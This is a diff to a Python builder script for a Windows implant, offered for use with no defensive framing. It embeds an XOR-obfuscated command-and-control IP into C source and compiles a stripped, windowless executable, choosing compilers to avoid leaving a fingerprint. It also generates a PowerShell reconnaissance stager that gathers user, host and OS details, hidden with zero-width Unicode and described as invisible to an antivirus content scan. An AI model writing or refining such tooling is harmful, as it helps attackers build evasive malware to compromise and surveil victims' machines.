@@ -189,8 +189,8 @@ def build_c_source(target_ip: str, port: int, xor_key: int, isun_magic: str = "I
     ip_bytes   = ",".join(f"0x{b:02x}" for b in ip_enc)
     isun_bytes = ",".join(f"0x{b:02x}" for b in isun_enc)
 
-    src = src.replace("{C2_IP_ENC}",   ip_bytes)
-    src = src.replace("{ISUN_ENC}",    isun_bytes)
+    src = src.replace("{C2_IP_ENC}",   "{" + ip_bytes + "}")
+    src = src.replace("{ISUN_ENC}",    "{" + isun_bytes + "}")
     src = src.replace("IP_LEN_VAL",   str(len(ip_enc)))
     src = src.replace("ISUN_LEN_VAL", str(len(isun_enc)))
     src = src.replace("XOR_KEY_VAL",  f"0x{xor_key:02x}")
@@ -200,22 +200,39 @@ def build_c_source(target_ip: str, port: int, xor_key: int, isun_magic: str = "I
 
 
 def build_pe(src_path: str, out_path: str) -> bool:
-    compilers = ["x86_64-w64-mingw32-gcc", "gcc"]
-    flags = [
-        "-Os", "-s",
-        "-Wl,--strip-all",
-        "-fno-ident",
-        "-fno-asynchronous-unwind-tables",
-        "-lws2_32",
-        "-mwindows",
-        "-o", out_path,
-        src_path,
-    ]
-    for cc in compilers:
+    # Try MinGW first (preferred — no MSVC fingerprint)
+    for cc in ["x86_64-w64-mingw32-gcc", "gcc"]:
         if shutil.which(cc):
-            r = subprocess.run([cc] + flags, capture_output=True, text=True)
+            r = subprocess.run([cc, "-Os", "-s", "-Wl,--strip-all", "-fno-ident",
+                                "-fno-asynchronous-unwind-tables", "-lws2_32",
+                                "-mwindows", "-o", out_path, src_path],
+                               capture_output=True, text=True)
             if r.returncode == 0 and os.path.exists(out_path):
                 return True
+
+    # Fallback: MSVC cl.exe via vcvarsall
+    vcvars_roots = [
+        r"C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvarsall.bat",
+        r"C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvarsall.bat",
+        r"C:\Program Files (x86)\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat",
+    ]
+    for vcvars in vcvars_roots:
+        if os.path.exists(vcvars):
+            out_dir  = os.path.dirname(out_path)
+            out_name = os.path.basename(out_path)
+            cl_cmd = (
+                f'call "{vcvars}" x64 >nul 2>&1 && '
+                f'cl.exe /nologo /O1 /W0 /MT '
+                f'"{src_path}" ws2_32.lib '
+                f'/link /SUBSYSTEM:WINDOWS /LTCG '
+                f'/OUT:"{out_path}" '
+                f'/PDB:nul >nul 2>&1'
+            )
+            r = subprocess.run(["cmd.exe", "/c", cl_cmd],
+                               cwd=out_dir, capture_output=True, text=True)
+            if os.path.exists(out_path):
+                return True
+
     return False
 
 
@@ -292,7 +309,7 @@ def build(target: str, port: int, xor_key: int, out_dir: str, variant: int = 1):
         sz = 0
 
     print(f"\n[3/4] Generating ghost PS1 stager ({os.path.basename(ps1_path)})...")
-    recon_ps1 = f"""$u=[System.Environment]::UserName;$h=[System.Net.Dns]::GetHostName();$o=[System.Environment]::OSVersion.VersionString;$i=(Test-Connection -ComputerName $h -Count 1).IPV4Address.IPAddressToString;"{u}|{h}|{o}|{i}"|Out-String"""
+    recon_ps1 = r'$u=[System.Environment]::UserName;$h=[System.Net.Dns]::GetHostName();$o=[System.Environment]::OSVersion.VersionString;"$u|$h|$o"|Out-String'
     ghost_encode_ps1(recon_ps1, ps1_path)
     print(f"      Zero-width Unicode encoding applied. Invisible to KAV content scan.")
 
